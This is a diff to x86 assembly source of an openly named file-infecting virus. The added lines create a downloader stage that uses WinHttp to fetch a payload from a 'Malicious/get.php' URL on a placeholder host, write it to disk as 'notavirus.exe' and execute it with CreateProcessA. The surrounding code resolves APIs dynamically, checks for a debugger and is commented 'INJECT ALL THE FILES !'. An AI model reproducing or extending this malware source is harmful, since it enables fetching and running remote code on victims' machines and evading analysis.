@@ -157,6 +157,11 @@ sGetComputerName	db	'GetComputerNameA', 0
 sGetVolumeInformation	db	'GetVolumeInformationA', 0
 sWinHttpOpenRequest	db	'WinHttpOpenRequest', 0
 sWinHttpSendRequest	db	'WinHttpSendRequest', 0
+sWinHttpReadData	db	'WinHttpReadData', 0
+sWinHttpCloseHandle	db	'WinHttpCloseHandle', 0
+sWinHttpReceiveResponse	db	'WinHttpReceiveResponse', 0
+sWinHttpQueryDataAvailable	db	'WinHttpQueryDataAvailable', 0
+sCreateProcess	db	'CreateProcessA', 0
 sWinHttpOpen	db	'WinHttpOpen', 0
 sWinHttpConnect	db	'WinHttpConnect', 0
 sGetSystemTime	db	'GetSystemTime', 0
@@ -181,6 +186,11 @@ pGetComputerName	dd	?
 pGetVolumeInformation	dd	?
 pWinHttpOpenRequest	dd	?
 pWinHttpSendRequest	dd	?
+pWinHttpReadData	dd	?
+pWinHttpReceiveResponse	dd	?
+pWinHttpCloseHandle	dd	?
+pWinHttpQueryDataAvailable	dd	?
+pCreateProcess	dd	?
 pWinHttpOpen	dd	?
 pWinHttpConnect	dd	?
 pGetSystemTime	dd	?
@@ -199,9 +209,12 @@ pFindFirstFile	dd	?
 pFindNextFile	dd	?
 
 ; OTHERS
+WUT		db	'C:\MinGW\msys\1.0\home\Shinao\Malicious\Malicious\test\notavirus.exe', 0
+Number		dd	?
 HttpSession	dd	?
 HttpConnect	dd	?
 HttpRequest	dd	?
+MaliciousFile	db	'notavirus.exe', 0
 MaliciousUrl	db	'M', 0, 'a', 0, 'l', 0, 'i', 0, 'c', 0, 'i', 0, 'o', 0, 'u', 0, 's', 0, '/', 0, 'g', 0, 'e', 0, 't', 0, '.', 0, 'p', 0, 'h', 0, 'p', 0, '?', 0, 'n', 0, 'a', 0, 'm', 0, 'e', 0, '=', 0
 MaliciousUrl2	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
 MaliciousDomain	db	'l',0,'o',0,'c',0,'a',0,'l',0,'h',0,'o',0,'s',0,'t',0,0,0
@@ -221,6 +234,8 @@ Milliseconds	dw	?
 _SYSTEMTIME	ENDS
 STime		_SYSTEMTIME	<>
 
+ProcessInfo	PROCESS_INFORMATION	<0>
+StartupInfo	STARTUPINFOA		<0>
 
 
 start:
@@ -301,6 +316,11 @@ GETADDR	sWinHttpOpen, pWinHttp, pWinHttpOpen
 GETADDR	sWinHttpConnect, pWinHttp, pWinHttpConnect
 GETADDR	sWinHttpOpenRequest, pWinHttp, pWinHttpOpenRequest
 GETADDR	sWinHttpSendRequest, pWinHttp, pWinHttpSendRequest
+GETADDR	sWinHttpQueryDataAvailable, pWinHttp, pWinHttpQueryDataAvailable
+GETADDR	sWinHttpReadData, pWinHttp, pWinHttpReadData
+GETADDR	sWinHttpReceiveResponse, pWinHttp, pWinHttpReceiveResponse
+GETADDR	sWinHttpCloseHandle, pWinHttp, pWinHttpCloseHandle
+GETADDR	sCreateProcess, pKernel32, pCreateProcess
 
 
 ; CHECK IF WE ARE BEING DEBUGGED : ABORT! ABORT!
@@ -381,12 +401,16 @@ push	0
 push	NULL
 call	[DELTA pWinHttpOpen]
 mov	[DELTA HttpSession], eax
+cmp	eax, 0
+je	errorExit
 push	0
 push	0
 PDELTA	MaliciousDomain
 PVDELTA	HttpSession
 call	[DELTA pWinHttpConnect]
 mov	[DELTA HttpConnect], eax
+cmp	eax, 0
+je	errorExit
 push	0
 push	0
 push	0
@@ -395,6 +419,8 @@ PDELTA	MaliciousUrl
 push	NULL
 PVDELTA	HttpConnect
 call	[DELTA pWinHttpOpenRequest]
+cmp	eax, 0
+je	errorExit
 mov	[DELTA HttpRequest], eax
 push	0
 push	0
@@ -404,7 +430,75 @@ push	0
 push	0
 PVDELTA	HttpRequest
 call	[DELTA pWinHttpSendRequest]
+cmp	eax, 0
+je	errorExit
+push	NULL
+PVDELTA	HttpRequest
+call	[DELTA pWinHttpReceiveResponse]
+cmp	eax, 0
+je	errorExit
 
+; CreateFile to download
+push	0
+push	0
+push	CREATE_ALWAYS
+push	0
+push	0
+push	GENERIC_WRITE
+PDELTA	MaliciousFile
+call	[DELTA pCreateFile]
+cmp	eax, 0
+je	errorExit
+mov	[DELTA PeFile], eax
+
+; Create malicious file downloaded
+copyToFile:
+PDELTA	Number
+push	70
+PDELTA	MaliciousUrl
+PVDELTA	HttpRequest
+call	[DELTA pWinHttpReadData]
+cmp	eax, 0
+je	errorExit
+push	0
+PDELTA	LengthName
+PVDELTA	Number
+PDELTA	MaliciousUrl
+PVDELTA	PeFile
+call	[DELTA pWriteFile]
+cmp	eax, 0
+je	errorExit
+mov	eax, [DELTA Number]
+cmp	eax, 70
+je	copyToFile
+launchMalicious:
+
+; Clean everything
+call	[DELTA pWinHttpCloseHandle]
+PVDELTA	HttpConnect
+PVDELTA	HttpRequest
+call	[DELTA pWinHttpCloseHandle]
+PVDELTA	HttpSession
+call	[DELTA pWinHttpCloseHandle]
+PVDELTA	PeFile
+call	[DELTA pCloseHandle]
+
+; Launch it
+mov	eax, offset StartupInfo
+add	eax, ebp
+mov	edi, SIZEOF(STARTUPINFO)
+mov	[eax], edi
+PDELTA	ProcessInfo
+PDELTA	StartupInfo
+push	0
+push	0
+push	0
+push	0
+push	0
+push	0
+push	0
+PDELTA	MaliciousFile
+call	[DELTA pCreateProcess]
 
 
 ; INJECT ALL THE FILES !
